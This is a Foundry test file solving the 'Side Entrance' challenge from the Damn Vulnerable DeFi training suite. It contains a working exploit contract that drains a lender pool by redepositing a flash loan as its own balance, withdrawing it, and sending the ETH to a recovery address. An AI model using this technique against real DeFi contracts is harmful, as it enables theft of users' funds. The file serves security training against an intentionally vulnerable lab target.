// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceExploiter {
    // Contrat attaquant pour exploiter la réentrance
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function startAttack() public {
        // 1. On demande un flash loan de tout l'ETH de la pool
        pool.flashLoan(address(pool).balance);
        // 3. On withdraw après le flash loan (notre balance interne est remplie)
        pool.withdraw();
    }
    
    // Callback appelé pendant le flash loan
    function execute() public payable {
        // 2. Pendant le flash loan, on re-deposit l'ETH reçu
        // Ça met à jour notre balance interne mais l'ETH reste dans la pool
        // Du point de vue de la pool, on a "remboursé" le flash loan
        pool.deposit{value: msg.value}();
    }

    receive() external payable {
        // 4. On transfère l'ETH récupéré vers recovery
        payable(recovery).transfer(address(this).balance);
    }
}

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // On déploie et exécute l'exploit de réentrance
        SideEntranceExploiter exploiter = new SideEntranceExploiter(pool, recovery);
        exploiter.startAttack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}
